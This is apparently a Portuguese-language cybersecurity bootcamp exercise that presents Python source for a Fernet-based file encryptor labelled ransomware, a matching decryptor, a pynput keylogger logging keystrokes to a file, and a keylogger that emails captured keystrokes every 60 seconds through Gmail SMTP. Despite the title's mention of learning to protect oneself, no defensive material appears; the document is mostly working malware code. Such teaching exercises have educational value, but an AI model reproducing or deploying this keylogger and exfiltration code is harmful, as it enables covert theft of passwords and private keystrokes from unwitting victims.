# Desafio_C-digo2_BootcampCyberDIO

Simulando um Malware de Captura de Dados Simples em Python e Aprendendo a se Proteger

Malware - Um software criado para causar danos, comprometer ou roubar dados
exemplos: vírus, woerm, spyware, trojan, ransomware

CÓDIGO RAMSOMWARE
import os
from cryptography.fernet import Fernet

# -------------------------
# 1) Geração / leitura de chave
# -------------------------
def gerar_chave(path="chave.key"):
    ***"""***

    ***Gera uma chave Fernet e salva no arquivo especificado.***

    ***Se o arquivo já existir, ele NÃO será sobrescrito.***

    ***Retorna a chave (bytes).***

    ***"""***

    ***if os.path.exists(path):***

        ***raise FileExistsError(f"Arquivo de chave '{path}' já existe. Use carregar\_chave() ou remova o arquivo se quiser gerar uma nova chave.")***

    ***chave = Fernet.generate\_key()***

    ***with open(path, "wb") as f:***

        ***f.write(chave)***

    ***print(f"Chave gerada e salva em '{path}'. Guarde esse arquivo com segurança!")***

    ***return chave***




def carregar_chave(path="chave.key"):
    ***"""***

    ***Carrega a chave do arquivo especificado.***

    ***Retorna a chave (bytes).***

    ***"""***

    ***if not os.path.exists(path):***

        ***raise FileNotFoundError(f"Arquivo de chave '{path}' não encontrado. Gere uma chave com gerar\_chave().")***

    ***with open(path, "rb") as f:***

        ***return f.read()***




# -------------------------
# 2) Funções de criptografia / descriptografia
# -------------------------
def criptografar_arquivo(caminho_arquivo, chave):
    ***"""***

    ***Criptografa o arquivo especificado usando a chave (bytes).***

    ***OBS: por simplicidade este exemplo sobrescreve o arquivo original.***

    ***Fazer backup antes de usar em arquivos importantes.***

    ***"""***

    ***if not os.path.exists(caminho\_arquivo):***

        ***raise FileNotFoundError(f"Arquivo '{caminho\_arquivo}' não encontrado.")***

    ***f = Fernet(chave)***

    ***with open(caminho\_arquivo, "rb") as arquivo:***

        ***dados = arquivo.read()***

    ***dados\_criptografados = f.encrypt(dados)***

    ***# sobrescreve o mesmo arquivo — cuidado!***

    ***with open(caminho\_arquivo, "wb") as arquivo:***

        ***arquivo.write(dados\_criptografados)***

    ***print(f"Arquivo '{caminho\_arquivo}' criptografado com sucesso.")***




def descriptografar_arquivo(caminho_arquivo, chave):
    ***"""***

    ***Descriptografa o arquivo especificado usando a chave (bytes).***

    ***"""***

    ***if not os.path.exists(caminho\_arquivo):***

        ***raise FileNotFoundError(f"Arquivo '{caminho\_arquivo}' não encontrado.")***

    ***f = Fernet(chave)***

    ***with open(caminho\_arquivo, "rb") as arquivo:***

        ***dados = arquivo.read()***

    ***try:***

        ***dados\_decript = f.decrypt(dados)***

    ***except Exception as e:***

        ***raise ValueError("Falha ao descriptografar: a chave pode estar errada ou o arquivo não foi criptografado com esta chave.") from e***

    ***with open(caminho\_arquivo, "wb") as arquivo:***

        ***arquivo.write(dados\_decript)***

    ***print(f"Arquivo '{caminho\_arquivo}' descriptografado com sucesso.")***




# -------------------------
# 3) Interface simples de linha de comando
# -------------------------
def main():
    ***print("Escolha uma ação:")***

    ***print("  1 - Gerar nova chave (salva em 'chave.key')")***

    ***print("  2 - Criptografar um arquivo (usa 'chave.key')")***

    ***print("  3 - Descriptografar um arquivo (usa 'chave.key')")***

    ***escolha = input("Digite 1, 2 ou 3: ").strip()***



    ***if escolha == "1":***

        ***caminho = "chave.key"***

        ***if os.path.exists(caminho):***

            ***confirmar = input(f"'{caminho}' já existe. Deseja sobrescrever? (s/n): ").strip().lower()***

            ***if confirmar != "s":***

                ***print("Operação cancelada.")***

                ***return***

            ***os.remove(caminho)***

        ***gerar\_chave(caminho)***



    ***elif escolha in ("2", "3"):***

        ***# carregar chave***

        ***try:***

            ***chave = carregar\_chave("chave.key")***

        ***except FileNotFoundError:***

            ***print("Arquivo de chave não encontrado. Gere uma chave primeiro (opção 1).")***

            ***return***



        ***caminho\_arquivo = input("Caminho do arquivo (por exemplo dados.txt): ").strip()***

        ***if escolha == "2":***

            ***# Antes de criptografar, sugerimos fazer backup***

            ***confirmar = input("ATENÇÃO: recomenda-se fazer backup do arquivo. Deseja continuar e sobrescrever o arquivo? (s/n): ").strip().lower()***

            ***if confirmar != "s":***

                ***print("Operação cancelada.")***

                ***return***

            ***criptografar\_arquivo(caminho\_arquivo, chave)***

        ***else:***

            ***# descriptografar***

            ***try:***

                ***descriptografar\_arquivo(caminho\_arquivo, chave)***

            ***except ValueError as e:***

                ***print(str(e))***



    ***else:***

        ***print("Escolha inválida. Saindo.")***




if __name__ == "__main__":
    ***main()***







DESCRIPTOGRAFANDO ARQUIVO:


import os
from cryptography.fernet import Fernet

# ------------------------------
# Carrega a chave usada na criptografia
# ------------------------------
def carregar_chave():
    ***"""***

    ***Lê o arquivo 'chave.key' e retorna a chave.***

    ***"""***

    ***return open("chave.key", "rb").read()***







# ------------------------------
# Descriptografa os dados usando a chave
# ------------------------------
def descriptografar_dados(dados_criptografados):
    ***"""***

    ***Recebe os bytes criptografados e retorna os bytes descriptografados.***

    ***"""***

    ***# Inicializa o objeto Fernet com a chave carregada***

    ***f = Fernet(carregar\_chave())***



    ***# Faz a descriptografia***

    ***dados\_descriptografados = f.decrypt(dados\_criptografados)***



    ***return dados\_descriptografados***







# ------------------------------
# Verifica se o arquivo existe
# ------------------------------
def encontrar_arquivo(caminho_arquivo):
    ***"""***

    ***Verifica se o arquivo existe. Se não existir, lança erro.***

    ***"""***

    ***if not os.path.exists(caminho\_arquivo):***

        ***raise FileNotFoundError(f"Arquivo '{caminho\_arquivo}' não encontrado.")***

    

    ***return caminho\_arquivo***







# ------------------------------
# Função principal
# ------------------------------
def main():
    ***# Nome do arquivo que será descriptografado***

    ***caminho\_arquivo = "arquivo\_criptografado.txt"***



    ***# Verifica se o arquivo existe***

    ***encontrar\_arquivo(caminho\_arquivo)***



    ***# Lê os dados criptografados***

    ***with open(caminho\_arquivo, "rb") as arquivo:***

        ***dados\_criptografados = arquivo.read()***



    ***# Descriptografa os dados***

    ***dados\_descriptografados = descriptografar\_dados(dados\_criptografados)***



    ***# Salva em um novo arquivo***

    ***with open("arquivo\_descriptografado.txt", "wb") as arquivo:***

        ***arquivo.write(dados\_descriptografados)***



    ***print(f"Arquivo '{caminho\_arquivo}' descriptografado com sucesso!")***







# Executa o programa
if __name__ == "__main__":
    ***main()***







ARQUIVO KEYLOGGER:


from pynput import keyboard

# Teclas que você quer ignorar ou registrar de outra forma
ignorar = {
    keyboard.Key.shift, keyboard.Key.shift_r,
    keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
    keyboard.Key.alt_l, keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd, keyboard.Key.cmd_r,
}

def on_press(key):
    try:
        # Se for caractere normal
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)
    except AttributeError:
        # Se for tecla especial
        with open("log.txt", "a", encoding="utf-8") as f:

            if key == keyboard.Key.space:
                f.write(" ")

            elif key == keyboard.Key.enter:
                f.write("\n")

            elif key == keyboard.Key.tab:
                f.write("\t")

            elif key == keyboard.Key.backspace:
                f.write(" [BACKSPACE] ")

            elif key == keyboard.Key.esc:
                f.write(" [ESC] ")

            elif key == keyboard.Key.delete:
                f.write(" [DEL] ")

            elif key in ignorar:
                f.write(f" [{key}] ")

# Listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

ENVIANDO DADOS CAPTURADOS PARA EMAIL AUTOMÁTICO:
from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

email_origem = ""
email_destino = ""
senha = ""

log = ""  # inicializar o log

def enviar_email():
    global log
    
    if log:
        try:
            msg = MIMEText(log)
            msg['Subject'] = 'Dados Capturados'
            msg['From'] = email_origem
            msg['To'] = email_destino

            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(email_origem, senha)
            server.sendmail(email_origem, email_destino, msg.as_string())
            server.quit()

        except Exception as e:
            print(f"Erro ao enviar email: {e}")

        log = ""  # limpa o log após enviar

    Timer(60, enviar_email).start()  # agenda envio a cada 60s


def on_press(key):
    global log

    try:
        # teclas normais
        log += key.char  

    except AttributeError:
        # teclas especiais
        if key == keyboard.Key.space:
            log += " "

        elif key == keyboard.Key.enter:
            log += "\n"

        elif key == keyboard.Key.backspace:
            log += "[BACKSPACE]"

        else:
            # ignora teclas como shift, ctrl, alt
            log += f"[{key}]"


# Iniciar envio automático a cada 60 segundos
enviar_email()

# Iniciar o keylogger
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
